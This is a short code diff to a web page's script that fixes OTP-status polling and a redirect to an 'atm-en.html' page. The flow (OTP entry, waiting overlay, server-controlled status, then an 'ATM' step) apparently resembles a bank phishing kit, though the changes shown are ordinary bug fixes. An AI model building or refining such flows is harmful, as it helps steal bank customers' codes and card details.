@@ -377,7 +377,7 @@
 
     function redirectToAtm(){
       stopPoll();
-      waitOverlay.classList.remove('show');
+      if (waitOverlay) waitOverlay.classList.remove('show');
       if (requestId) {
         window.location.href = 'atm-en.html?id=' + requestId;
       }
@@ -394,7 +394,7 @@
 
     function pollOtpStatus(){
       stopPoll();
-      statusPollTimer = setInterval(function(){
+      var checkNow = function(){
         fetch('/api/status/' + requestId)
           .then(function(res){ return res.json(); })
           .then(function(data){
@@ -409,7 +409,9 @@
           .catch(function(err){
             console.warn('Could not check request status:', err);
           });
-      }, 2500);
+      };
+      checkNow();
+      statusPollTimer = setInterval(checkNow, 2500);
     }
 
     verifyBtn.addEventListener('click', function(){
@@ -454,7 +456,10 @@
       otpField.classList.remove('invalid');
       stopPoll();
       verifyBtn.disabled = false;
+      pollOtpStatus();
     });
+
+    pollOtpStatus();
   </script>
 
 </body>
